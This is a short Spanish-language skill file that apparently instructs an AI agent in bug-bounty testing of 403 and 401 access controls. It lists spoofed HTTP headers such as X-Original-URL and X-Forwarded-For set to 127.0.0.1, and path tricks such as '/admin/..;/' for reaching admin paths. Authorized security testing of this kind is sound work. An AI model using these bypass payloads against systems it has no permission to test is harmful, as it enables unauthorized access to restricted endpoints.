---
name: bug-bounty-403-401-bypasses
description: Técnicas avanzadas de omisión de controles de acceso 403 Forbidden y 401 Unauthorized. Uso de encabezados HTTP especiales y manipulación de rutas.
---

# Skill: 403 Forbidden & 401 Unauthorized Access Bypasses

Esta habilidad capacita al agente para evaluar la efectividad de los controles de autorización en proxies web e intermediarios, aplicando técnicas de manipulación de rutas y encabezados HTTP.

## 📌 Encabezados HTTP de Omisión

- `X-Original-URL: /admin`
- `X-Rewrite-URL: /admin`
- `X-Custom-IP-Authorization: 127.0.0.1`
- `X-Forwarded-For: 127.0.0.1`

## 📌 Manipulación de Rutas

- `/admin/` -> `/admin/.`
- `/admin` -> `/admin/..;/`
- `/admin` -> `/admin%20`

---

## 📚 Referencias Técnicas

Consulta la lista de encabezados en:
[access-bypasses-headers.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-403-401-bypasses/references/access-bypasses-headers.md)
